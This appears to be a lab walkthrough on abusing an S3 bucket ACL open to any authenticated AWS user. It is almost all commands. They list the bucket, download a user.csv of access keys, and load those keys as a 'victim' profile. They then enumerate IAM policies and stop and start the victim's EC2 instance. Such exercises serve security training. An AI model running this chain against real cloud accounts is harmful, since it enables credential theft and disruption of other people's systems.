# ACL Authenticated group 


* Clone the repository 

```bash
git clone https://github.com/bvabhishek/misconfigured_acl.git
```
* Go to Directory 

```bash
 cd misconfigured_acl/
```
* change the permission of bucket_finder tool
```bash
chmod 777 bucket_finder.rb
```
* Lets use the bucket_finder tool to check our target bucket exist or not

```bash
./bucket_finder.rb my_words
```

* Go to the target URL and check if there is any attack scenario

    * https://vallabh.s3-us-west-2.amazonaws.com/

* Let's make the s3 bucket name as gloabal variable as we need to use it again

```bash
export s3bucket=<bucketname>
```
```bash
echo $s3bucket
```

* Let's try enumerating the S3 bucket by listing the object

```bash
aws s3 ls s3://$s3bucket

```

* Now lets try accessing it though our AWS profile (your own)

* if you havent configured your profile follow the below steps

```bash
aws configure --profile #your_profile_name
```

* Now try listing thew objects

```bash
aws s3 ls s3://$s3bucket --profile your_profile_name
```

* Fish around the bucket 

```bash
aws s3 ls s3://$s3bucket/etc/ --profile your_profile_name
```

* Download the juicy file (Relative path to your present working directory)

```bash
aws s3 cp s3://$s3bucket/etc/user.csv . --profile your_profile_name
```
* See the contents of csv file 
```bash
cat user.csv
```
* configure the access key id and secret access key as attacker profile 

```bash
aws configure --profile victim

```
* Now check if you can access if any S3 objects present by using aws cli

```bash
aws s3 ls --profile victim
```

* Check the user profile 

```bash
aws sts get-caller-identity --profile victim
```
* lets try to pull out any s3 files

```bash
aws s3 ls --profile victim
```

* Now lets check the user policies attached to the user if any, to figure out which all resources he might have

```bash
aws iam list-attached-user-policies --user-name victim --profile victim
```

* we came to know that he has ec2 access, now check if any running ec2 instance

* lets check if any running ec2 instance 

```bash

aws ec2 describe-instances --profile victim --region us-west-2 --query 'Reservations[].Instances[?State.Name==`running`]' --output json

```

* lets export the instance id i-083b2833c663866d1

```bash
export iId=<instance id>
```
```bash
echo $iId
```

* Copy the Public IP address and paste in browser

```bash
aws ec2 describe-instances --instance-ids $iId --region us-west-2 --query 'Reservations[0].Instances[0].PublicIpAddress' --output text --profile victim

```
* Open new terminal 

* Lets stop the instance 

```bash
aws ec2 stop-instances --instance-id $iId --profile victim --region us-west-2

```
* Lets stop the instance 

```bash
aws ec2 start-instances --instance-id $iId --profile victim --region us-west-2

```

* To check where may be the misconfiguration 
```bash
aws s3api get-bucket-acl --bucket $s3bucket --profile victim
```

* Another misconfiguration is providing excess policy such as "IAMReadOnlyAccess"

```bash 
aws iam list-attached-user-policies --user-name victim --profile victim
```
